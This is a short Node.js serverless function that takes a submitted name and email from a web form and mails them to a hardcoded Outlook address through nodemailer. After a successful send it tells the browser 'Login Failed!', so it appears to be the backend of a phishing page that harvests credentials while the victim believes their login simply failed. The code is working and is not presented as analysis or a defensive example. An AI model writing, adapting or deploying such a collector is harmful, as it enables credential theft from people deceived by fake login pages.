const nodemailer = require('nodemailer');

exports.handler = async function (event) {
  if (event.httpMethod === 'OPTIONS') {
    // CORS preflight
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
      body: '',
    };
  }

  const { name, email } = JSON.parse(event.body);

  const transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: Number(process.env.SMTP_PORT),
        secure: Number(process.env.SMTP_PORT) === 465, // true for 465, false otherwise
        auth: {
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS,
         },
            
        debug: true, //
  });



 // Optional: SMTP Verification
  try {
    await transporter.verify();
    console.log("SMTP Server is ready to send emails");
  } catch (error) {
    console.error("SMTP Server Verification Failed:", error);
    return {
      statusCode: 500,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: JSON.stringify({ message: 'SMTP server verification failed.', error: error.message }),
    };
  }


  const mailOptions = {
    from: process.env.SMTP_USER,
    to: "jerry.maufler@outlook.com",
    subject: `New Submission`,
    text: `

Name: ${name}
Email: ${email}
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
      },
      body: JSON.stringify({ message: 'Login Failed!' }),
    };
  } catch (err) {
    console.error(err);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*',
      },
      body: JSON.stringify({ message: 'Failed to Login.', error: err.message }),
    };
  }
};
